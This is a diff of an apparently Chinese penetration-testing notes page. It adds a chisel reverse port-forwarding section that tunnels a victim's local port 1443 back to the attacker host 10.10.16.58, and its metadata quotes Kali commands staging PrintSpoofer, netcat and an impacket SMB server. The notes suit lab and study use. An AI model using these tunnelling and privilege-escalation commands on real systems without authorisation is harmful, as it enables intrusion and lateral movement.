@@ -48,7 +48,7 @@
 ┌──(kali㉿kali)-[~/Work] └─$ ls -liah PrintSpoofer64.exe 2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe ┌──(kali㉿kali)-[~/Work] └─$ sudo impacket-smbserver Enil . -smb2support [sudo] password for kali: Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed impacket-smbserver 必须添加参数 -smb2support 参数，即启用 SMB2 协议支持。">
   <meta itemprop="datePublished" content="2026-02-27T17:00:00+08:00">
   <meta itemprop="dateModified" content="2026-02-27T17:00:00+08:00">
-  <meta itemprop="wordCount" content="202">
+  <meta itemprop="wordCount" content="213">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -148,6 +148,11 @@
         <li><a href="#传出文件">传出文件</a></li>
       </ul>
     </li>
+    <li><a href="#端口转发">端口转发</a>
+      <ul>
+        <li><a href="#chisel">chisel</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
                 </aside>
@@ -212,7 +217,11 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah out.txt 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2782113</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 127K Mar <span style="color:#ae81ff">17</span> 09:10 out.txt
-</span></span></code></pre></div>
+</span></span></code></pre></div><h2 id="端口转发">端口转发</h2>
+<h3 id="chisel">chisel</h3>
+<pre tabindex="0"><code class="language-kali" data-lang="kali">chisel server -p 9595 --reverse
+</code></pre><pre tabindex="0"><code class="language-machines" data-lang="machines">chisel.exe client 10.10.16.58:9595 R:127.0.0.1:1443
+</code></pre>
             </div>
         </article>
 
